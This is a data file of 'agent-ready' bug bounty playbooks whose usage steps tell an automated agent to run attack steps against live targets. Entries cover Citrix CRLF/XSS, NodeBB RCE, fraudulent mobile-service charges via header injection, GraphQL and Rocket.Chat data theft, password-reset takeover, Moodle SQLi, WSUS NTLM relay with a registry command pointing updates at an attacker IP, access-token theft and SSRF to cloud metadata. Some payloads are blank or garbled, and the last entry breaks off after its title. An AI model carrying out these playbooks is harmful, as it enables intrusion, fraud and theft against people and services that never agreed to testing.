description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: HTTP Header Injection In Citrix ADC And Citrix Gateway (CVE-2020-8300, CVE-2021-22927)

target_profile.technology: Citrix ADC and Citrix Gateway (when configured as SAML SP or IdP)

trigger_conditions.when_to_apply: When Citrix ADC or Citrix Gateway is configured as a SAML Service Provider (SP) or SAML Identity Provider (IdP) and handles user redirection after SAML authentication.
prerequisites: Target is configured as SAML SP or IdP
Attacker can control the RelayState parameter during SAML authentication flow
Victim is logged into the SAML Identity Provider
applicability_signals: Citrix ADC/Gateway is in use
Application uses SAML for authentication
Observable redirects during SAML authentication
skip_if: Target does not use SAML
RelayState parameter is validated and sanitized for newline characters and special characters

recon_steps: Step 1: Identify target instances of Citrix ADC or Citrix Gateway. Fingerprint for these products by observing HTTP headers or HTML source.
Step 2: Confirm if the target is using SAML for authentication by observing SAMLRequest and RelayState parameters during login or access to protected resources.
attack_steps: Step 1: Access a protected page on the target application to initiate the SAML authentication flow and capture a valid SAMLRequest.
Step 2: Craft a manipulated RelayState parameter containing CR-LF characters followed by malicious JavaScript code and an injected HTTP header like `Content-Type: text/html`.
Step 3: Lure a victim, who is already authenticated with the SAML IdP, to an attacker-controlled page that submits the crafted SAMLRequest and manipulated RelayState to the IdP via an HTML form.

Step 4: Observe the HTTP response from the Citrix appliance when it redirects the victim back. The appliance should process the manipulated RelayState, leading to the injection of the attacker's script.
payloads_or_patterns:
Encodable string for RelayState: `
Content-Type: text/html

<script>alert('XSS')</script>` (URL-encoded form would be submitted)

HTML form for submitting SAMLRequest and RelayState: <form action="<TARGET_URL>/sso" method="POST"><input type="hidden" name="SAMLRequest" value="<VALID_SAML_REQUEST>"><input type="hidden" name="RelayState" value="<MALIPULATED_RELAY_STATE_URL_ENCODED>"><input type="submit" value="Submit request"></form>
tools_recommended: Burp Suite: To capture SAML requests and responses, craft manipulated RelayState parameters, and host the attacker-controlled page.
URL Encoder/Decoder: To properly encode the malicious RelayState for submission.
success_indicators: Execution of attacker-provided JavaScript in the victim's browser, e.g., an alert box displaying 'XSS'.
HTTP response from the Citrix appliance contains the injected headers and script within the Location header value.
failure_indicators: RelayState parameter is rejected or sanitized, preventing CR-LF injection.
Victim's browser does not execute the script due to CSP or other security measures.
HTTP 4xx or 5xx errors indicating malformed requests.

playbooks.impact: Execution of arbitrary JavaScript in the victim's browser, potentially leading to session hijacking, credential theft, or further account takeover within the protected application.
playbooks.key_lesson: When handling user-supplied parameters like 'RelayState' in SAML flows, always strictly validate and sanitize them to prevent injection of control characters (CR, LF) and malicious content.

meta.title: NodeBB 1.18.4 - Remote Code Execution With One Shot

trigger_conditions.when_to_apply: When an attacker has administrative access to a NodeBB instance running version 1.18.4 or earlier.
prerequisites: Attacker has administrator credentials for the NodeBB instance.
applicability_signals: NodeBB version is 1.18.4 or lower.
Access to the admin panel is available.
skip_if: NodeBB version is higher than 1.18.4.
Administrator account is not compromised or accessible.

recon_steps: Identify the NodeBB version by checking the footer or source code.
Gain administrative access to the NodeBB instance.
attack_steps: Step 1: Navigate to the 'Admin' -> 'Settings' -> 'Advanced' page in the NodeBB administration panel.
Step 2: Locate the 'Custom HTML for theme' field.
Step 3: Inject a malicious script into the 'Custom HTML for theme' field. The script should leverage the `require` function to execute arbitrary code.
Step 4: Save the changes.
tools_recommended: Burp Suite or similar proxy to intercept and modify requests when saving settings.
success_indicators: Execution of the injected command on the server. This could manifest as a reverse shell, file creation, or other server-side actions.
Observing the output of the command if it's designed to produce visible output (e.g., writing to a file accessible via the web).
failure_indicators: The NodeBB instance does not execute the command.
The 'Custom HTML for theme' field sanitizes or rejects the payload.
A 4xx or 5xx error is returned upon saving the settings.

playbooks.impact: Allows an attacker with administrative privileges to execute arbitrary commands on the server hosting NodeBB, leading to full system compromise, data theft, or further malicious activities.
playbooks.key_lesson: Always thoroughly sanitize user-provided input, especially in administrative settings, as improper handling can lead to critical vulnerabilities like RCE.

meta.title: Play The Opera Please

tech_stack_fingerprints: Opera Mini browser data saving modes (direct, extreme, high)
HTTPS based session creation by Opera Mini

trigger_conditions.when_to_apply: When the target system uses a Value Added Service (VAS) subscription process that relies on HTTP header enrichment (HE Process) and the user is accessing the service via the Opera Mini browser with data saving modes enabled.
prerequisites: Target system vulnerable to HTTP header injection in VAS subscription.
Victim's MSISDN is obtainable by the attacker.
applicability_signals: A specific 'ping' request is observed when opening Opera Mini for the first time after clearing cache and temp data.
Opera Turbo servers are used for session establishment.
GGSN acts as a routing device without performing HE process on HTTPS.
skip_if: The target system correctly validates and filters all injected HTTP headers.
The Opera Mini browser version does not exhibit the described 'ping' request behavior or header injection vulnerability.

recon_steps: Step 1: Observe network traffic (e.g., using Wireshark) when accessing a VAS subscription process via Opera Mini (with data saving enabled) and clearing browser cache.
Step 2: Identify the initial 'ping' request generated by Opera Mini responsible for MSISDN and session creation.
attack_steps: Step 1: Obtain the victim's MSISDN.
Step 2: Craft an HTTP request that includes the victim's MSISDN within the headers, targeting the observed 'ping' request.
Step 3: Send the crafted request via the Opera Mini browser.
Step 4: Observe the VAS subscription flow to confirm if a session is established using the victim's number.
Step 5: Attempt to subscribe to a VAS service to confirm fraudulent activation and potential deduction of digital money.
payloads_or_patterns: Inject HTTP headers containing the victim's MSISDN into the initial 'ping' request generated by Opera Mini.
tools_recommended: Wireshark: To capture and analyze network traffic, identify the 'ping' request and headers.
Burp Suite: To intercept and modify HTTP requests, specifically the 'ping' request, to inject custom headers.
success_indicators: VAS subscription is successfully activated using the victim's MSISDN.
Digital money is deducted from the victim's account.
Server logs indicate activation of VAS services without the victim's explicit consent.
failure_indicators: VAS subscription fails or is attributed to the attacker's MSISDN.
An error response is received indicating invalid or missing MSISDN.
Opera Turbo server rejects the injected headers.

playbooks.impact: Fraudulent activation of Value Added Services (VAS) leading to unauthorized charges on the victim's mobile account and potential financial loss.
playbooks.key_lesson: Always test HTTP header enrichment processes for vulnerabilities by injecting unexpected or sensitive headers, especially in scenarios involving data compression or intermediary servers.

meta.title: How I got my first bounty on financial sector gateway site by using Previous GraphQL vulnerabilities.

trigger_conditions.when_to_apply: When a target application utilizes a GraphQL API and exposed introspection is not disabled.
prerequisites: Attacker must have a valid user session or be able to authenticate.
applicability_signals: Application uses GraphQL instead of REST API.
The `/graphql` endpoint is accessible.
skip_if: GraphQL introspection is explicitly disabled by the server.
Application uses a REST API exclusively.

recon_steps: Step 1: Identify the GraphQL endpoint, typically '/graphql' or similar, by proxying traffic and observing requests.
Step 2: Send a sample GraphQL query (e.g., a simple query to retrieve user details) to the identified endpoint to confirm it's functional and observe response structure.
attack_steps: Step 1: Send a GraphQL introspection query to retrieve the full schema, including all types and fields. Example query: https://api.kivipay.com/graphql?query={__schema{types{name,fields{name}}}}
Step 2: Analyze the schema returned by the introspection query to identify sensitive types or fields (e.g., '__typename': 'Auth org', 'Auth request').

Step 3: Craft and execute GraphQL queries targeting sensitive fields or types identified in the schema, substituting or manipulating parameters to access data belonging to other users or perform unauthorized actions.
Step 4: Example query to retrieve sensitive information by targeting 'Auth org' and its fields: { Auth_org { id name address } }
tools_recommended: Burp Suite: To intercept and modify HTTP requests, observe GraphQL queries and responses.
GraphiQL or GraphQL Playground: For interactive exploration of the GraphQL schema and execution of queries.
success_indicators: Responses containing sensitive information of other users (e.g., names, addresses, financial details).
Successful execution of transactions or operations that should require higher privileges or different user context.
The response includes data related to '__typename': 'Auth org' or similar sensitive types.
failure_indicators: 400 Bad Request or 404 Not Found for introspection queries (may indicate introspection is disabled).
Empty or incomplete schema returned (may indicate partial disabling of introspection).
Specific error messages indicating unauthorized access for sensitive fields (try different queries or explore other fields).

playbooks.impact: Disclosure of sensitive user information, ability to perform unauthorized financial transactions, potential for account takeover or further compromise of the financial gateway system.
playbooks.key_lesson: Always attempt GraphQL introspection on any identified GraphQL endpoint to discover the full schema and identify potential data exposure or unauthorized action vectors.

meta.title: WordPress Plugin Confusion: How an update can get you pwned

affected_components: WordPress plugins and themes (specifically those with conflicting names or update mechanisms)
tech_stack_fingerprints: WordPress installation detected (e.g., /wp-login.php responds 200, presence of wp-content directory)

trigger_conditions.when_to_apply: This technique applies to WordPress sites where a legitimate plugin or theme has been abandoned or unmaintained, and a malicious actor has registered a similar-sounding plugin or theme for impersonation. The target must also be susceptible to automatically updating plugins/themes.
prerequisites: The target WordPress site must have automatic plugin/theme updates enabled.
A vulnerable plugin/theme must be installed that has been abandoned or is no longer actively maintained.
An attacker must be able to register a malicious plugin/theme with a name very similar or identical to the legitimate one.
applicability_signals: Existence of multiple plugins/themes with very similar names in the WordPress plugin repository.
Indicators of abandoned or outdated plugins/themes on the target site (e.g., last updated years ago, no recent changelog entries).
WordPress site configured for automatic updates.
skip_if: Automatic updates are disabled on the target WordPress site.
All installed plugins and themes are actively maintained and regularly updated.
No similarly named plugins/themes exist in the repository that could be used for impersonation.

recon_steps: Step 1: Identify installed plugins and themes on the target WordPress site. Note their names and versions.
Step 2: Search the WordPress.org plugin/theme repository for plugins/themes with identical or very similar names to those installed on the target.
Step 3: Analyze the identified plugins/themes in the repository for signs of abandonment (e.g., last updated date, lack of recent support replies, low download counts compared to the original).
Step 4: Verify the target WordPress site's update settings to confirm if automatic updates are enabled for plugins and themes.
attack_steps: Step 1: If a suitable abandoned plugin/theme is found, and a similarly named malicious one exists or is created by the attacker, wait for the target site to perform its automatic update check.
Step 2: When the target site checks for updates, it will incorrectly identify the malicious plugin/theme as a legitimate update for the installed one due to the name confusion.
Step 3: The target site will then download and install the malicious plugin/theme, replacing the legitimate one.
Step 4: Execute the malicious payload within the installed plugin/theme on the target server.
payloads_or_patterns: A malicious WordPress plugin or theme file containing arbitrary code execution vulnerabilities (e.g., PHP code that executes commands, establishes backdoors, or exfiltrates data).
tools_recommended: WPScan: To enumerate installed plugins and themes, check for vulnerabilities, and identify outdated components.
WordPress.org Plugin/Theme Repository search: To find similarly named plugins/themes.
Manual inspection of plugin/theme code: To identify potential vulnerabilities in the malicious package.
success_indicators: The WordPress site's administrative dashboard shows the malicious plugin/theme as active, even though the attacker never directly installed it.
Execution of commands on the target server (e.g., via a reverse shell or simple `whoami` command).
Exfiltration of sensitive data from the target server.
Successful installation of a web shell or backdoor.
failure_indicators: The target site does not update to the malicious plugin/theme (e.g., due to strict update policies or naming differences not caught by the confusion).
The malicious plugin/theme is detected and removed by security plugins (e.g., Wordfence) on the target site.
The malicious payload fails to execute or is properly sanitized/escaped, preventing exploitation.

playbooks.impact: Attacker can gain full control of the WordPress website, leading to data theft, defacement, hosting malware, or using the server for further attacks. This is a supply chain attack where the trust in the WordPress update mechanism is exploited.
playbooks.key_lesson: When investigating WordPress sites, always check for installed plugins/themes that are outdated or unmaintained, as these present a prime opportunity for similarly named malicious impersonations to be installed via the automatic update mechanism.

meta.title: RocketChat - Monitor User Messages

trigger_conditions.when_to_apply: When an instance of Rocket.Chat is running and accessible, and there's a possibility to guess or discover room IDs (rids) and user IDs.
prerequisites: Rocket.Chat instance is running and accessible.
Ability to interact with the Rocket.Chat API, specifically Meteor.call.
applicability_signals: Existence of room IDs (e.g., #general channel having rid 'GENERAL', direct message rids being concatenations of user IDs).
API endpoints that do not strictly enforce authentication for retrieving room or message data.
skip_if: All API endpoints return 401 or 403 without valid authentication.
WAF blocks requests to Meteor.call endpoints.
Room IDs are completely opaque and not guessable.

recon_steps: Step 1: Enumerate potential room IDs (rids). Look for default channels like '#general' which might have 'GENERAL' as its rid. For direct messages, try concatenating known or guessed user IDs.
Step 2: Identify potential user IDs. If user IDs are sequential or follow a pattern, try enumerating them.
Step 3: Investigate API endpoints related to room access or message retrieval using tools like Burp Suite or a custom script. Look for methods that might be vulnerable like 'canAccessRoom'.
attack_steps: Step 1: Send a request to the Rocket.Chat API using `Meteor.call` to the `canAccessRoom` method.
Step 2: Provide a guessed or enumerated `rid` and a `userID` as parameters to the `canAccessRoom` method.
Step 3: If the `canAccessRoom` method returns successful access (e.g., 200 OK with user data), attempt to retrieve the last message for that room using another API call.
Step 4: If successful, iterate through discovered user IDs and room IDs to monitor messages.
tools_recommended: Burp Suite: To intercept and modify API requests, analyze responses, and perform brute-force or enumeration of rids and user IDs.
Custom Python script: To automate the process of enumerating rids and user IDs and sending requests to the `canAccessRoom` method, as provided in the exploit link.
success_indicators: The `canAccessRoom` method returning a success status code (e.g., 200 OK) and user information, even without authentication.
Subsequent API calls to retrieve messages from the room succeed and return message content, potentially revealing messages sent by other users.
failure_indicators: The `canAccessRoom` method returning an error, such as 'error-invalid-room' or 'error-access-denied', even with guessed `rid` and `userID`. This might indicate that `rid`s are not guessable or there's another layer of protection. Suggestion: Investigate other API methods for authorization flaws.

API calls consistently returning 401 or 403 errors, indicating strong authentication is enforced on all relevant endpoints. Suggestion: Pivot to different vulnerability classes like XSS or SSRF if applicable.

playbooks.impact: An unauthenticated attacker can monitor the last messages of any room (channels, direct messages, group messages) in Rocket.Chat by exploiting a lack of authentication and authorization checks in the `canAccessRoom` method. This allows for the exfiltration of sensitive communication data.
playbooks.key_lesson: Always implement robust authentication and authorization checks for API methods, especially those that access or retrieve sensitive user or room data, even if parameters are provided by the client.

meta.title: Account Takeover in $Million Company?

trigger_conditions.when_to_apply: When a user initiates a password reset and the application relies on verifiable requestor attributes that can be manipulated.
prerequisites: Attacker can intercept or influence HTTP requests from the victim.
Victim initiates a password reset.
applicability_signals: Password reset flow allows requests without robust session verification.
Server-side verification relies on potentially spoofable client-side attributes like User-Agent.
skip_if: Password reset flow requires multi-factor authentication or verifiable tokens sent via email/SMS.
Server strictly validates IP address and User-Agent against established session data.

recon_steps: Step 1: Navigate to the Fastmail password reset page.
Step 2: Initiate a password reset for a known Fastmail account (e.g., owned by a friend or a test account).
attack_steps: Step 1: Observe the HTTP request made when initiating the password reset.
Step 2: Note the User-Agent header in the initial password reset request.
Step 3: Ask a victim (or a second test account) to initiate a password reset.
Step 4: Intercept the victim's password reset request and capture their User-Agent header.
Step 5: Using your own account (or a captured victim session), modify your outgoing password reset request to use the victim's User-Agent header.
Step 6: Submit the modified request.
Step 7: If successful, you will be prompted to set a new password without prior verification of your identity beyond the User-Agent.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, specifically the User-Agent header.
Ngrok: To generate a shareable link for the victim to click, allowing the attacker to intercept their request.
success_indicators: The application allows the attacker to proceed to the password change page without additional verification steps after spoofing the User-Agent.
The attacker successfully sets a new password for the victim's account.
failure_indicators: The application returns an error or prompts for additional verification (e.g., email confirmation, captcha) after the User-Agent is spoofed. Pivot to testing other headers or parameters.
The application correctly identifies the User-Agent mismatch and rejects the request. This indicates some level of validation is present, but perhaps not sufficient.

playbooks.impact: Complete account takeover of a Fastmail account, allowing the attacker to read, send, and delete emails, as well as change account settings.
playbooks.key_lesson: Never rely solely on client-provided headers like User-Agent for security-sensitive operations such as password resets; always validate identity through independent, secure channels.

meta.title: Moodle Blind SQL injection via MNet authentication

target_profile.required_access_level: any_authenticated_user (on a compromised Moodle instance to attack peers)

trigger_conditions.when_to_apply: When an attacker has compromised one Moodle instance and wants to attack its peers via the MNet protocol, or when MNet keypairs are leaked.
prerequisites: Target Moodle instance has MNet enabled and configured.
Attacker has control over a Moodle instance that is a peer to the target Moodle instance, or has access to a Moodle instance with leaked MNet keypairs.
The specific MNet XMLRPC method `auth/mnet/auth.php/keepalive_server` is exposed and callable.
applicability_signals: Existence of `/mnet/xmlrpc/client.php` and `/mnet/lib.php` files.
MNet functionality being enabled and configured in Moodle.
Responses indicating MNet communication protocols.
skip_if: MNet functionality is disabled or not configured.
Target Moodle instance does not have MNet peers.
WAF blocks XMLRPC requests or specific parameters.

recon_steps: Step 1: Identify Moodle instances and check if MNet is enabled and configured using Moodle's administration interface or by checking relevant configuration files.
Step 2: If the attacker controls a Moodle instance, configure it to be a peer to the target Moodle instance or obtain leaked MNet keypairs for the target.
Step 3: Confirm the existence and accessibility of the `/mnet/xmlrpc/client.php` endpoint on the target Moodle instance.
attack_steps: Step 1: Craft a malicious XMLRPC request targeting the `auth/mnet/auth.php/keepalive_server` endpoint on the peer Moodle instance. The request should contain SQL injection payloads in parameters that are unsanitized.
Step 2: Sign and encrypt the crafted XMLRPC message using the MNet protocol, employing the attacker's Moodle instance's private key and the target's public key.
Step 3: Send the signed and encrypted XMLRPC request to the target Moodle instance's `/mnet/xmlrpc/client.php` endpoint.
Step 4: Analyze the response for signs of SQL injection, such as error messages, altered behavior, or time delays indicative of blind SQL injection.
Step 5: Iterate on the SQL injection payload to extract data, confirm user IDs, or identify other sensitive information.
payloads_or_patterns: XMLRPC request with SQLi payload in parameters sent to /mnet/xmlrpc/client.php. Example payload pattern for blind SQLi: `' OR 1=1 --`, `' OR SLEEP(5) --`
The actual XML structure will involve `signedMessage` and `encryptedMessage` tags, with the XMLRPC request content base64 encoded within.
tools_recommended: Custom Python script utilizing Moodle's MNet library or reimplementing XMLRPC signing and encryption, or Burp Suite with custom XML processing extensions.
success_indicators: Blind SQLi: Observable time delays in response (e.g., 5-second delay for `SLEEP(5)` payload).
Error messages in the response that reveal SQL syntax errors.
Successful enumeration of user data or site configuration parameters after successful blind SQLi.
failure_indicators: 403 Forbidden or connection refused errors: Indicates WAF or network blocking. Pivot to finding other vulnerable MNet methods or configuration errors.
Consistent 200 OK responses without any observable change: Suggests payload is not being processed correctly or not reaching the database. Try different SQLi syntax or encoding.

playbooks.impact: Attacker can gain unauthorized access to sensitive Moodle data, including user credentials, course content, and personal information. In advanced scenarios, it could lead to further compromise of the Moodle server or network.
playbooks.key_lesson: When testing Moodle MNet functionality, always inspect the XMLRPC communication for unsanitized parameters that can be exploited for SQL injection, especially when dealing with peer-to-peer communication.

meta.title: From Intigriti challenge to a Vue.js script gadget

tech_stack_fingerprints: Vue.js is explicitly mentioned and used in the challenge

HTML contains `
` which is common in Vue.js single-page applications
WAF replacement of keywords with % characters

trigger_conditions.when_to_apply: When user input is reflected in the HTML source without proper sanitization, especially when Vue.js is in use and a Content Security Policy (CSP) allows `unsafe-eval`.
prerequisites: Target application reflects user-controlled input in the HTML response.
Target application uses Vue.js.
The CSP allows script execution via `unsafe-eval` or similar directives.
applicability_signals: URL query parameters (like `s` in the writeup) are reflected in the HTML.
HTML tags like `<` and `>` are not escaped.
The response headers or meta tags indicate `script-src 'unsafe-eval'` or equivalent in the CSP.
skip_if: Input is properly HTML-escaped, preventing injection.
The CSP strictly forbids `unsafe-eval` and other dynamic script execution vectors.
A WAF blocks all attempts at script injection or known script gadgets.

recon_steps: Step 1: Identify endpoints that reflect URL query parameters directly into the HTML content. Look for parameters that are not properly encoded.
Step 2: Analyze the Content Security Policy (CSP) headers and meta tags to understand restrictions on script execution.

Step 3: Identify if the application uses Vue.js by observing the presence of `
` and potential Vue-specific attributes or global variables.
attack_steps: Step 1: Inject basic HTML to confirm reflection, e.g., `?s=`.

Step 2: If basic HTML injection works but XSS is blocked by CSP, attempt Vue.js template injection. Close the existing `<title>` tag and inject a new `<div id="app">` element with a malicious payload.
Step 3: If WAF blocks keywords, try obfuscation or bypass techniques. The writeup mentions a WAF replacing `this` with `%is%`.
Step 4: Exploit the `slot-scope` attribute as a deprecated Vue.js feature that accepts function expressions. Craft a payload to break out of the function context and execute arbitrary JavaScript.

Step 5: If escaping to the global scope is needed, use `this.constructor.constructor` or similar patterns, being mindful of WAF filtering. The writeup suggests using `_c.constructor.constructor` to bypass the WAF's filtering of `this`.
payloads_or_patterns:
Vue.js Template Injection (conceptual, needs WAF bypass): `

`

Vue.js `slot-scope` exploitation with scope escape (example from writeup): `

`
tools_recommended: Burp Suite (Repeater/Intruder) to send modified requests and analyze responses.
Browser Developer Tools to inspect HTML, CSP, and JavaScript execution.
Vue.js documentation for API details and understanding template syntax.
success_indicators: An alert box pops up with a JavaScript execution result (e.g., `alert(origin)`, `alert(document.domain)`).
The browser navigates to a new URL controlled by the attacker.
The attacker receives a callback on their controlled server (e.g., Burp Collaborator).
failure_indicators: 5xx server errors indicate a payload might be too complex or malformed for the server-side processing.
403 Forbidden responses suggest a WAF is actively blocking the payload.
No JavaScript execution and no changes in the application behavior after sending the payload indicate the injection point is not vulnerable or the payload is incorrect.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser session, allowing for session hijacking, data theft, redirection to malicious sites, and further attacks on the user or the application.
playbooks.key_lesson: When `unsafe-eval` is present in the CSP, investigate Vue.js applications for template injection vulnerabilities, paying close attention to deprecated attributes like `slot-scope` and using constructor chaining to escape execution contexts, while being prepared for WAF bypasses.

meta.title: Abusing Windows Server Update Services (WSUS) to Enable NTLM Relaying Attacks

trigger_conditions.when_to_apply: When an attacker has network access to a Windows machine that is configured to use a WSUS server for updates, and the WSUS server is vulnerable to NTLM relay.
prerequisites: Attacker can reach the target WSUS server over the network.
Target WSUS server is configured to receive updates from clients.
Target WSUS server is not protected against NTLM relay attacks (e.g., via Extended Protection for Authentication).
applicability_signals: WSUS service running on default ports (8530/8531).
Client machines initiating connections to the WSUS server for updates.
skip_if: WSUS server has Extended Protection for Authentication enabled.
Network segmentation prevents attacker from reaching WSUS server.

recon_steps: Step 1: Identify WSUS server IP addresses and ports on the target network. Look for open TCP ports 8530 and 8531.
Step 2: Fingerprint the identified servers to confirm they are running WSUS (e.g., using Nmap scripts or by observing HTTP responses).
attack_steps: Step 1: Configure an NTLM relay tool (e.g., ntlmrelayx.py) to listen for incoming NTLM authentication attempts.

Step 2: On a compromised Windows client machine, configure its update source to point to the attacker-controlled relay server instead of the legitimate WSUS server. This can be done via Group Policy or direct registry modification.
Step 3: Trigger the client machine to check for updates. This will cause the client to attempt to authenticate to the attacker-controlled relay server using NTLM.
Step 4: The NTLM relay tool captures the NTLM authentication and relays it to the legitimate WSUS server.
Step 5: If the WSUS server is vulnerable and the relay is successful, the attacker can use the obtained session to execute commands on the WSUS server as a privileged user (e.g., SYSTEM).
payloads_or_patterns: Modify WSUS server configuration to point to attacker's IP: `reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUServer /t REG_SZ /d http://<ATTACKER_IP>:80`
Start ntlmrelayx.py with SMB server and HTTP server enabled: `python ntlmrelayx.py -tf targets.txt -smbsupport -socks`
tools_recommended: ntlmrelayx.py (from impacket)
Responder (for LLMNR/NBT-NS poisoning, to redirect clients to attacker)
Metasploit Framework (for post-exploitation modules)
success_indicators: ntlmrelayx.py successfully authenticates to the WSUS server with relayed credentials.
Execution of commands on the WSUS server via the relayed session (e.g., `whoami` returns SYSTEM).
Ability to dump SAM database or other sensitive information from the WSUS server.
failure_indicators: NTLM authentication fails with error messages like 'NTLMSSP: Response authentication failed'.
WSUS server rejects the relayed connection (e.g., 401 Unauthorized).
No commands can be executed on the WSUS server. Pivot to checking for Extended Protection for Authentication on the WSUS server.

playbooks.impact: Remote code execution (RCE) on the WSUS server with SYSTEM privileges, allowing the attacker to compromise the entire Windows domain, exfiltrate sensitive data, and deploy further malware.
playbooks.key_lesson: Always verify WSUS server configurations and ensure Extended Protection for Authentication is enabled to mitigate NTLM relay attacks.

meta.title: A common defect in java system-Memory DoS (include CVE-2021-2344, CVE-2021-2371, CVE-2021-2376, CVE-2021-2378)

trigger_conditions.when_to_apply: When a Java application deserializes untrusted data, specifically targeting components known to be vulnerable to memory exhaustion during object deserialization.
prerequisites: The target application uses Java deserialization.
The application is vulnerable to `OutOfMemoryError` during the deserialization of specific classes.
applicability_signals: The target application processes serialized Java objects from an untrusted source.
The application uses vulnerable versions of Java SE.
The writeup mentions specific vulnerable classes like `ZoneRules` or `MimeType`.
skip_if: The target application explicitly disables Java deserialization.
The target application uses an up-to-date, patched version of Java SE that mitigates these specific vulnerabilities.

recon_steps: Step 1: Identify if the target application performs Java deserialization of user-controlled input. This may involve observing network traffic for serialized objects or identifying code paths that use `ObjectInputStream`.

Step 2: Determine the version of Java SE being used by the target application. If it is an older version (e.g., prior to Java SE 8u301 for the specific CVEs mentioned), this attack vector is more likely to be successful.
attack_steps: Step 1: Craft a malicious serialized Java object targeting `java.time.zone.ZoneRules` or `java.awt.datatransfer.MimeType` that causes excessive memory allocation during deserialization.
Step 2: Send the crafted serialized object to the target application via an endpoint that accepts deserialized data.
Step 3: Monitor the target application for signs of memory exhaustion, such as `java.lang.OutOfMemoryError` exceptions or unresponsiveness.
payloads_or_patterns: A serialized Java object that, when deserialized by `java.time.zone.ZoneRules.readExternal`, leads to excessive memory allocation (e.g., by controlling `stdSize` to be a very large value).

A serialized Java object that, when deserialized by `java.awt.datatransfer.MimeType.readExternal`, leads to excessive memory allocation (e.g., by controlling the size of the byte array read for a long MIME type).
tools_recommended: ysoserial or similar tools for generating Java deserialization payloads.
Burp Suite or OWASP ZAP for intercepting and modifying network traffic to inject serialized objects.
success_indicators: The target application crashes or becomes unresponsive.
The target application logs `java.lang.OutOfMemoryError`.
Observable network degradation or service unavailability.
failure_indicators: The deserialization completes without error, and the application remains responsive. This could indicate the version is patched or the specific class is not used in a vulnerable way. Pivot: Investigate other deserialization gadgets or different types of DoS vulnerabilities.

playbooks.impact: Denial of Service (DoS) by exhausting the application's memory, leading to crashes, unresponsiveness, and service unavailability for legitimate users.
playbooks.key_lesson: Always test Java applications that perform deserialization of untrusted input for memory exhaustion vulnerabilities by crafting malicious serialized objects targeting known vulnerable classes and versions.

meta.title: URL whitelist bypass in https://cxl-services.appspot.com

trigger_conditions.when_to_apply: When a web application, specifically an App Engine service, acts as a proxy and performs domain validation on user-supplied URLs.
prerequisites: Target has a proxy endpoint that performs domain whitelisting.
The domain validation mechanism is susceptible to the '@' trick bypass.
applicability_signals: The target application has a '/proxy' endpoint or similar functionality.
The proxy endpoint accepts a 'url' parameter.
The application likely uses a regex for URL validation similar to RFC 3986 Appendix B.
skip_if: The proxy endpoint does not accept external URLs as input.
The domain validation is robust and does not allow bypasses like the '@' trick.

recon_steps: Step 1: Identify proxy endpoints by looking for keywords like 'proxy', 'redirect', 'fetch' in application paths and functionality.
Step 2: Confirm the target proxy endpoint accepts a 'url' parameter and observe its behavior with valid and invalid URLs.
attack_steps: Step 1: Construct a URL using the '@' trick to bypass domain whitelisting. The format is 'https://<your_controlled_domain>@<target_domain>/<path>'.
Step 2: Send a request to the target proxy endpoint with the crafted URL. For example: GET https://cxl-services.appspot.com/proxy?url=https://<your_controlled_domain>@jobs.googleapis.com/
Step 3: Monitor your controlled server (VPS with HTTPS) for incoming requests to verify the bypass and capture any headers sent by the proxy, such as the Authorization header.
Step 4: If the bypass is successful, analyze the stolen access token to identify accessible GCP projects and resources.
Step 5: Attempt to interact with GCP APIs using the stolen access token to enumerate and access resources within the identified projects.
tools_recommended: Burp Suite: To intercept and modify requests, and to log traffic to a controlled server.
Python with Flask/Django: To set up a custom HTTPS server on a VPS to receive and inspect incoming requests.
LetsEncrypt: To obtain an SSL certificate for the custom domain.
success_indicators: The proxy application sends an `Authorization: Bearer <access-token>` header in requests to your controlled server.
The captured access token grants access to GCP projects or internal resources when used with GCP APIs.
API calls made with the stolen token successfully enumerate or access data from target GCP projects (e.g., listing GCE instances).
failure_indicators: The target proxy returns a 400 or 403 error for the crafted URL, indicating the bypass failed.
No `Authorization` header is present in the request to the controlled server, meaning the bypass did not lead to token exfiltration.
API calls made with the stolen token return unauthorized errors, indicating the token has insufficient privileges or is invalid.

playbooks.impact: An attacker can steal an access token for the 'cxl-services.appspot.com' App Engine service. This token can grant broad access to GCP projects like 'docai-demo', 'cxl-services', 'garage-staging', and 'p-jobs', potentially leading to privilege escalation, access to internal compute instances, and full control over the 'cxl-services.appspot.com' application.
playbooks.key_lesson: When validating user-supplied URLs, be aware of advanced bypass techniques like the '@' trick, which can manipulate URL parsing and lead to unexpected domain resolutions and access.

meta.title: Reacting to myself finding an SSRF vulnerability in Google Cloud

trigger_conditions.when_to_apply: This technique is applicable when an SSRF vulnerability is identified within Google Cloud services, allowing an attacker to make requests from the cloud environment.
prerequisites: discovery of an SSRF vulnerability in a Google Cloud service.
applicability_signals: insufficient detail in writeup
skip_if: insufficient detail in writeup

recon_steps: Step 1: Analyze the identified SSRF vulnerability to understand the specific service and function being exploited.
Step 2: Determine the network boundaries and available resources from within the exploited Google Cloud environment.
attack_steps: Step 1: Craft SSRF payloads to target internal Google Cloud metadata services (e.g., `http://169.254.169.254/computeMetadata/v1/`).
Step 2: Attempt to retrieve sensitive information such as service account credentials or project configuration.
Step 3: Use retrieved credentials or further SSRF capabilities to pivot to other services or escalate privileges.
tools_recommended: Burp Suite Collaborator for receiving callbacks
Custom scripts for automating metadata enumeration
success_indicators: Successful retrieval of metadata, including sensitive credentials or tokens.
Ability to access otherwise restricted Google Cloud resources using compromised credentials.
failure_indicators: Requests to metadata endpoints result in timeouts or connection refused errors, indicating network segmentation or WAF rules blocking access.
403 Forbidden responses when attempting to access specific metadata paths, suggesting insufficient permissions.

playbooks.impact: Exploitation can lead to the compromise of sensitive cloud infrastructure information, including service account credentials, allowing attackers to gain unauthorized access to Google Cloud resources and potentially escalate privileges within the affected project or organization.
playbooks.key_lesson: When SSRF vulnerabilities are found in cloud environments like Google Cloud, always prioritize testing against the instance metadata service (`http://169.254.169.254`) to retrieve credentials and pivot for further exploitation.

meta.title: CVE-2021-42306 CredManifest: App Registration Certificates Stored in Azure Active Directory

